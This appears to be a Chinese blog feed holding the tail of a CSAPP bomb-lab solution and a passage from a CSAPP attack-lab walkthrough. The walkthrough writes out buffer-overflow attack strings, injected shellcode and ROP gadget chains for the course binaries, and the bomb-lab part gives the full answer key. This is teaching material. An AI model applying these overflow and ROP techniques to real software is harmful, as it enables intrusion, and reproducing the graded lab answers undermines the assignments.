idx表示数组arrTree索引，userInput即用户输入的答案</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">fun7</span><span class="params">(<span class="type">int</span> idx, <span class="type">int</span> userInput)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(idx &lt; <span class="number">0</span> || idx &gt; <span class="number">14</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;  <span class="comment">// 如当前节点为NULL, 返回-1</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(arrTree[idx] &lt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">2</span>, userInput) + <span class="number">1</span>; <span class="comment">// 取当前节点的右子女</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(arrTree[idx] &gt; userInput) &#123;</span><br><span class="line">        ret = <span class="number">2</span> * fun7(<span class="number">2</span> * idx + <span class="number">1</span>, userInput); 	<span class="comment">// 取当前节点的左子女</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1002</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span>(fun7(<span class="number">0</span>, i) == <span class="number">2</span>) <span class="comment">// idx初值为0, 表示从二叉树的根开始递归</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;answer: %d\n&quot;</span>, i);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>执行C程序，打印如下，说明答案有两组, 输入<code>20</code>或<code>22</code>都可以。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">answer: 20</span><br><span class="line">answer: 22</span><br></pre></td></tr></table></figure>

<h3><span id="总结">总结</span></h3><p>所有关卡的答案保存在<code>answer</code>文件中，内容如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># cat answer</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">6 682</span><br><span class="line">7 0 DrEvil</span><br><span class="line">IONUVW</span><br><span class="line">4 3 2 1 6 5</span><br><span class="line">20</span><br></pre></td></tr></table></figure>

<p>执行结果如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line"># ./bomb answer</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">That&#x27;s number 2.  Keep going!</span><br><span class="line">Halfway there!</span><br><span class="line">So you got that one.  Try this one.</span><br><span class="line">Good work!  On to the next...</span><br><span class="line">Curses, you&#x27;ve found the secret phase!</span><br><span class="line">But finding it and solving it are quite different...</span><br><span class="line">Wow! You&#x27;ve defused the secret stage!</span><br><span class="line">Congratulations! You&#x27;ve defused the bomb!</span><br></pre></td></tr></table></figure>

<h3><span id="参考资料">参考资料</span></h3><p>《深入理解计算机系统 原书第3版》</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>Assembly</tag>
        <tag>CSAPP</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP 缓冲区溢出实验</title>
    <url>/2020/0802174715.html</url>
    <content><![CDATA[<h3><span id="实验介绍">实验介绍</span></h3><p>本实验中，我们需要利用缓冲区溢出漏洞，来修改一个二进制可执行文件的运行时行为。</p>
<h3><span id="预备知识">预备知识</span></h3><ul>
<li><p>缓冲区溢出的原理，参考《CSAPP原书第3版》<code>3.10</code>小节</p>
</li>
<li><p><code>gdb</code>和<code>objdump</code>使用</p>
</li>
<li><p>x86_64下的汇编</p>
</li>
</ul>
<span id="more"></span>

<h3><span id="实验准备">实验准备</span></h3><p>首先获取实验所需文件<code>target1.tar</code>:  <a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p><code>linux</code>下执行<code>tar xvf target1.tar</code>，得到如下文件。每个文件作用简述如下：</p>
<ul>
<li><p><code>ctarget</code>：代码注入攻击的程序。</p>
</li>
<li><p><code>rtarget</code>：ROP攻击的程序。</p>
</li>
<li><p><code>cookie.txt</code>: 记录<code>cookie</code>的值，攻击时需要用到。</p>
</li>
<li><p><code>farm.c</code>: 用于ROP攻击寻找<code>gadget</code>的文件。</p>
</li>
<li><p><code>hex2raw</code>：将ASCII码转化为字符串的小程序，用于构造攻击字符串。</p>
</li>
</ul>
<p>实验共有5关，每一关的目标如下：<br><img data-src="/2020/0802174715/image1.png"><br><strong>实验前，务必仔细阅读<code>attackLab</code>实验手册，可参考<a href="http://csapp.cs.cmu.edu/3e/attacklab.pdf">attacklab.pdf</a></strong></p>
<h3><span id="第一关">第一关</span></h3><p>这一关不需注入新的代码，只需要让目标程序<code>ctarget</code>重定向到一个已存在的过程即可。</p>
<p><code>ctarget</code>中定义了<code>test</code>函数, <code>test</code>函数会调用<code>getbuf</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">int</span> val;</span><br><span class="line">	val = getbuf();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;No exploit. Getbuf returned 0x%x\n&quot;</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ctarget</code>中还定义了<code>touch1</code>函数，C代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch1</span><span class="params">()</span> &#123;</span><br><span class="line">	vlevel = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Touch1!: you called touch1()\n&quot;</span>);</span><br><span class="line">	validate(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>本关的目标是：在<code>getbuf</code>函数返回时，令程序跳转到<code>touch1()</code>而不是从<code>test()</code>正常返回。</p>
<p>我们需要攻击<code>getbuf</code>函数，构造输入字符串，利用缓冲区溢出修改栈中的返回地址。</p>
<p>首先查看<code>getbuf</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:   48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:   48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:   e8 8c 02 00 00          callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:   48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:   c3                      retq   				#retq指令从栈中数据0x401976弹出，并作为返回地址跳转</span><br></pre></td></tr></table></figure>

<p>从<code>sub  0x28 %rsp</code>看出， <code>getbuf</code>函数在栈上分配了<code>40</code>个字节。再看下<code>test</code>函数的汇编代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble test</span><br><span class="line">Dump of assembler code for function test:</span><br><span class="line">   0x0000000000401968 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x000000000040196c &lt;+4&gt;:     mov    $0x0,%eax</span><br><span class="line">   0x0000000000401971 &lt;+9&gt;:     callq  0x4017a8 &lt;getbuf&gt; #将下一条指令0x401976压栈，并跳转到getbuf</span><br><span class="line">   0x0000000000401976 &lt;+14&gt;:    mov    %eax,%edx</span><br></pre></td></tr></table></figure>

<p>这里<code>callq</code>指令将<code>0x401976</code>压栈，并跳转到<code>getbuf</code>; <code>getbuf</code>执行结束后，使用<code>retq</code>指令从栈中弹出<code>0x401976</code>，并作为返回地址跳转。</p>
<p>假设输入字符串是<code>&quot;1234567876543210&quot;</code>， 程序执行到<code>0x4017b4</code>，此时栈组织如下：<br><img data-src="/2020/0802174715/image2.png"><br>因此，我们需要先把栈上<code>40</code>字节填满，然后将<code>touch1</code>的地址写到<code>$rsp + 0x28</code>处，覆盖原先正常的返回地址<code>0x401976</code>。下面找到<code>touch1</code>的地址为<code>0x4017c0</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(gdb) disassemble touch1</span><br><span class="line">Dump of assembler code for function touch1:</span><br><span class="line">   0x00000000004017c0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>

<p>构造攻击字符串, 写到文件<code>hex1</code></p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00					# 前40个字节任意填，目的是将第40个字节之后的返回地址改写为touch1的地址</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">c0 17 40 00 00 00 00 00					# 小端机器上，这里要注意端序</span><br></pre></td></tr></table></figure>

<p>利用<code>hex2raw</code>工具将字节码转为字符串，写到文件<code>answer1</code>， 用法如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./hex2raw &lt; hex1 &gt; answer1</span><br></pre></td></tr></table></figure>

<p>执行<code>ctarget</code>程序验证结果，其中<code>-i</code>指定字符串所在文件，<code>-q</code>必选参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># ./ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<h3><span id="第二关">第二关</span></h3><p>与第一关不同， 这关还需要在输入字符串中注入攻击代码。首先查看<code>touch2</code>代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">touch2</span><span class="params">(<span class="type">unsigned</span> val)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">2</span>;</span><br><span class="line">	<span class="keyword">if</span>(val == cookie) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch2!: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		validate(<span class="number">2</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch2(0x%.8x)\n&quot;</span>, val);</span><br><span class="line">		fail(<span class="number">2</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看出，我们需要在跳转到<code>touch2</code>的时候将<code>cookie</code>的值作为参数传递。思路如下：</p>
<ul>
<li><p>将返回地址改写为栈中的注入代码的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>在注入代码中，将<code>cookie</code>值传递到<code>%rdi</code>。因为<code>x86-64</code>汇编使用<code>%rdi</code>作为第一个参数</p>
</li>
<li><p>确定<code>touch2</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>首先确定栈的地址，在<code>0x4017af callq 401a40 &lt;Gets&gt;</code>处打断点，查看<code>%rsp</code>值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># gdb ctarget</span><br><span class="line">(gdb) set args -q -i answer1</span><br><span class="line">(gdb) b *0x4017af</span><br><span class="line">Breakpoint 1 at 0x4017af: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">Starting program: /home/pc/attackLab/target1/ctarget -q -i answer1</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Breakpoint 1, 0x00000000004017af in getbuf () at buf.c:14</span><br><span class="line">14      buf.c: No such file or directory.</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>

<p>得到栈的地址为<code>0x5561dc78</code>, 这正是我们注入代码所在的位置。</p>
<p>接下来需要将<code>cookie</code>值传给<code>%rdi</code>，再跳转到<code>touch2</code>。<code>touch2</code>地址可通过查看汇编代码得到，结果是<code>0x4017ec</code>；跳转到touch2的思路是：<strong>先利用<code>push</code>指令将<code>touch2</code>地址压栈，接着用<code>retq</code>从栈中弹出<code>touch2</code>地址并跳转。</strong></p>
<p>编写如下注入代码，保存到文件<code>inject2.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movl  $0x59b997fa, %edi			# cookie值为0x59b997fa</span><br><span class="line">pushq $0x4017ec					# touch2的起始地址为0x4017ec</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject2.s</code>, <code>objdump -d inject2.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   bf fa 97 b9 59          mov    $0x59b997fa,%edi</span><br><span class="line">   5:   68 ec 17 40 00          pushq  $0x4017ec</span><br><span class="line">   a:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>综上，得到我们需要输入的字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">bf fa 97 b9 59 68 ec 17				# 攻击代码位于地址0x5561dc78</span><br><span class="line">40 00 c3 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image3.png"></p>
<h3><span id="第三关">第三关</span></h3><p><code>touch3</code>代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	<span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">	<span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">	<span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">touch3</span><span class="params">(<span class="type">char</span> *sval)</span> &#123;</span><br><span class="line">	vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">	<span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		validate(<span class="number">3</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">		fail(<span class="number">3</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>和第二关类似，我们需要传入<code>cookie</code>字符串并跳转到<code>touch3</code>。但需要注意<code>hexmatch</code>函数被调用后，会覆盖一部分<code>getbuf</code>的缓冲区。为了避免这一点，可以将<code>cookie</code>字符串放到<code>test</code>的栈帧里。这一关的思路如下：</p>
<ul>
<li><p>将返回地址改写为注入代码所在的地址。栈的地址可以用<code>gdb</code>跑一把程序确认</p>
</li>
<li><p>将<code>cookie</code>字符串放到<code>test</code>的栈帧里。在注入代码中，将<code>cookie</code>串的首地址传递到<code>%rdi</code>。</p>
</li>
<li><p>确定<code>touch3</code>的起始地址并跳转。可利用<code>push</code>和<code>ret</code>指令实现跳转</p>
</li>
</ul>
<p>与第二关类似，编写如下注入代码，保存到文件<code>inject3.s</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov   $0x5561dca8,%rdi		# 将cookie字符串放到test栈帧中，这里放到返回地址(0x5561dca0)+0x8处</span><br><span class="line">pushq $0x4018fa				# 将touch3起始地址压栈</span><br><span class="line">retq						# 将touch3地址退栈，并跳转执行touch3</span><br></pre></td></tr></table></figure>

<p>执行<code>gcc -c inject3.s</code>, <code>objdump -d inject3.o</code>， 将汇编文件转为二进制， 得到如下机器码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>我第一次写这块汇编代码时，犯了两个错误：</p>
<ul>
<li><p>将<code>$0x5561dca8</code>错写成<code>$0x5561dca4</code>, 导致段错误。<strong>注意64位机器上执行压栈和退栈操作，栈指针<code>%rsp</code>应该减去或加上<code>8</code>，而不是<code>4</code></strong></p>
</li>
<li><p><code>pushq  $0x4018fa</code>中漏写了<code>$</code>符号，导致压栈的数据不对。<strong>注意对立即数操作时必须加上$符号</strong></p>
</li>
</ul>
<p>用<code>man ascii</code>查表 ，将字符串<code>59b997fa</code>转成ASCII码：<code>35 39 62 39 39 37 66 61</code></p>
<p>综上，得到我们需要输入字符串</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68				# 攻击代码位于地址0x5561dc78</span><br><span class="line">fa 18 40 00 c3 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00				# 改写返回地址为0x5561dc78</span><br><span class="line">35 39 62 39 39 37 66 61				# cookie字符串</span><br><span class="line">00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image4.png"></p>
<h3><span id="第四关">第四关</span></h3><p>在前三关，我们插入攻击代码，同时插入指向攻击代码的指针，而产生这个指针需要跑下代码确认栈的地址。但是在第四、五关的<code>rtarget</code>程序中，采用了如下策略防止代码注入攻击：</p>
<ul>
<li><strong>栈随机化</strong>，每次运行相同的程序，它们的栈地址是不同的。</li>
<li><strong>限制可执行代码区域</strong>，栈是不可执行的。</li>
</ul>
<p>既然注入代码不可行，能不能利用已有的可执行代码来实现目的呢？以下介绍一种叫<code>ROP</code>的攻击方式</p>
<h4><span id="rop">ROP</span></h4><p>即<code>return-oriented-programming</code>。策略是寻找已有的一些以<code>ret</code>命令结尾的指令(每条这样的指令称为<code>gadget</code>)，通过在这些<code>gadget</code>之间不断跳转，拼凑处我们想要的指令来实现攻击目的，如下图：(<code>c3</code>是<code>retq</code>的字节码)<br><img data-src="/2020/0802174715/image5.png"><br>在<code>rtarget</code>程序中，有很多这样的<code>gadget</code>可以利用，举例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p>注意到<code>48 89 c7</code>恰好是<code>movq %rax, %rdi</code>的编码， <code>c3</code>表示<code>ret</code>指令。因此这段代码包含了一个<code>gadget</code>，且起始地址为<code>0x4019a2</code>。也就是说，如果我们改写栈的返回地址到<code>0x4019a2</code>，就可以执行<code>movq %rax, %rdi</code>和<code>ret</code>两条已有指令，绕过了栈上不可执行代码的限制。思路如下：</p>
<ul>
<li>将<code>cookie</code>值传递给<code>%rdi</code>，难点在于如何用已有的<code>gadget</code>拼凑出我们需要的指令，可参考如下的指令表。</li>
<li>将<code>touch2</code>的起始地址放到栈中。查看汇编代码得到<code>touch2</code>地址为<code>0x4017ec</code>。<br><img data-src="/2020/0802174715/image6.png"><br><img data-src="/2020/0802174715/image7.png"><br><img data-src="/2020/0802174715/image8.png"><br><img data-src="/2020/0802174715/image9.png"></li>
</ul>
<p>另外，<code>ret</code>的字节编码是<code>0xc3</code>；<code>nop</code>的字节编码是<code>0x90</code>，啥也不做，只是将<code>%rip</code>加1。</p>
<p>可以在<code>start_farm</code>和<code>end_farm</code>之间找到所有可利用的<code>gadget</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401994 &lt;start_farm&gt;:</span><br><span class="line">  401994:   b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  401999:   c3                      retq</span><br><span class="line">000000000040199a &lt;getval_142&gt;:</span><br><span class="line">  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax</span><br><span class="line">  40199f:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:   c3                      retq</span><br><span class="line">00000000004019ae &lt;setval_237&gt;:</span><br><span class="line">  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)</span><br><span class="line">  4019b4:   c3                      retq</span><br><span class="line"># ......</span><br></pre></td></tr></table></figure>

<p>为了将<code>cookie</code>传给<code>%rdi</code>，可以先将<code>cookie</code>的值写到栈，再利用<code>popq %rdi</code>指令实现。</p>
<p>查表可知<code>pop</code>的编码在<code>58 ~ 5f</code>。全局搜索后没找到<code>5f c3</code>或<code>5f 90 c3</code>，说明不能用<code>$popq %rdi</code>一步到位；但是可以在<code>addval_219</code>中找到<code>58 90 c3</code>，先将栈中的值弹出传到<code>%rax</code>。记录起始地址为<code>0x4019ab</code>。</p>
<p>接着想办法把<code>%rax</code>的值传递到<code>%rdi</code>。查表，在gadget中找到<code>48 89 c7</code>，也就是<code>movq %rax, %rdi</code>指令，可以在<code>&lt;addval_273&gt;</code>中找到，而且后面正好跟了<code>c3</code>，记录起始地址为<code>0x4019a2</code>。</p>
<p>到此，我们完成了<code>gadget</code>的拼凑，输入的字符串如下：</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00							# 改写返回地址为0x4019ab, 执行popq %rax</span><br><span class="line">fa 97 b9 59 00 00 00 00							# 保存cookie的值: 0x59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00							# 执行mov %rax, %rdi</span><br><span class="line">ec 17 40 00 00 00 00 00							# 跳转到touch2, touch2起始地址为0x4017ec</span><br></pre></td></tr></table></figure>

<p>此时的栈组织如下：<br><img data-src="/2020/0802174715/image10.png"></p>
<h3><span id="第五关">第五关</span></h3><p>和第三关类似，这关需要将<code>cookie</code>字符串的首地址传给<code>%rdi</code>, 再调用<code>touch3</code>。</p>
<p>由于栈位置是随机的，需要用<strong>栈顶地址+偏移</strong>来确定<code>cookie</code>串的位置。 栈顶地址即<code>$rsp</code>，可通过<code>mov %rsp XXX</code>获取，偏移需要根据<code>gadget</code>指令的长度来确定。</p>
<p>如何将<code>cookie</code>串地址传到<code>%rdi</code>呢？可以在<code>farm.o</code>中可以找到如下的<code>gadget</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:   c3</span><br></pre></td></tr></table></figure>

<p>再结合所有<code>gadget</code>，多次尝试后发现一个可行解，如下：</p>
<ul>
<li><p>将<code>%rsp</code>传给<code>%rdi</code>，利用<code>mov</code>实现。</p>
</li>
<li><p>将偏移传给<code>%rsi</code>， 需利用<code>pop</code>和多个<code>mov</code>实现。偏移量需要在找到所有<code>gadget</code>后通过计算得出。</p>
</li>
<li><p>用<code>lea (%rdi,%rsi,1),%rax</code>，将<code>cookie</code>串的首地址传给<code>%rax</code></p>
</li>
<li><p>将<code>%rax</code>传给<code>%rdi</code>，利用<code>mov</code>指令</p>
</li>
</ul>
<h4><span id="具体步骤">具体步骤</span></h4><h5><span id="1-将rsp传给rdi">1. 将<code>%rsp</code>传给<code>%rdi</code></span></h5><p>通过<code>movq %rsp,%rax</code>,<code>movq %rax,%rdi</code>实现：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000000000401aab &lt;setval_350&gt;:</span><br><span class="line">  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)</span><br><span class="line">  401ab1:   c3                      retq</span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>movq %rsp,%rax</code>编码为<code>48 89 e0</code>, 地址为<code>0x401aad</code>。</p>
<p><code>movq %rax %rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019a2</code>。</p>
<h5><span id="2-将偏移传给rsi">2. 将偏移传给<code>$rsi</code></span></h5><p>先将偏移写到栈里，再通过如下<code>4</code>条指令传到<code>$rsi</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rax</span><br><span class="line">mov %eax, %edx</span><br><span class="line">mov %edx, %ecx</span><br><span class="line">mov %ecx, %rsi</span><br></pre></td></tr></table></figure>

<p>在以下的<code>gadget</code>中找到这<code>4</code>条指令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:   c3                      retq</span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:   c3                      retq</span><br><span class="line">0000000000401a33 &lt;getval_159&gt;:</span><br><span class="line">  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax</span><br><span class="line">  401a38:   c3                      retq</span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>pop %rax</code>编码为<code>58</code>, 地址为<code>0x4019cc</code>。</p>
<p><code>mov %eax %edx</code>编码为<code>89 c2</code>，地址为<code>0x4019dd</code>。</p>
<p><code>mov %edx %ecx</code>编码为<code>89 d1</code>，地址为<code>0x401a34</code>。</p>
<p><code>mov %ecx,%esi</code>编码为<code>89 ce</code>，地址为<code>0x401a13</code>。</p>
<h5><span id="3-将cookie字符串传给rdi">3. 将<code>cookie</code>字符串传给<code>%rdi</code></span></h5><p>利用<code>lea ($rdi,%rsi,1),%rax</code>，地址为<code>0x4019d6</code>。</p>
<h5><span id="4-将rax传给rdi">4. 将<code>%rax</code>传给<code>$rdi</code></span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:   c3                      retq</span><br></pre></td></tr></table></figure>

<p><code>mov %rax,%rdi</code>编码为<code>48 89 c7</code>，地址为<code>0x4019c5</code>。</p>
<p>到此，我们完成了<code>gadget</code>的构造，只需继续在栈中依次填入<code>touch3</code>返回地址，<code>cookie</code>字符串，<code>0</code>(字符串结束标志)，再确定偏移即可。</p>
<p>偏移应该是cookie字符串首地址减去(返回地址+0x8)， 中间隔了<code>9</code>条指令，因此偏移量为<code>72</code>, 即<code>0x48</code></p>
<p>输入的字符串如下：</p>
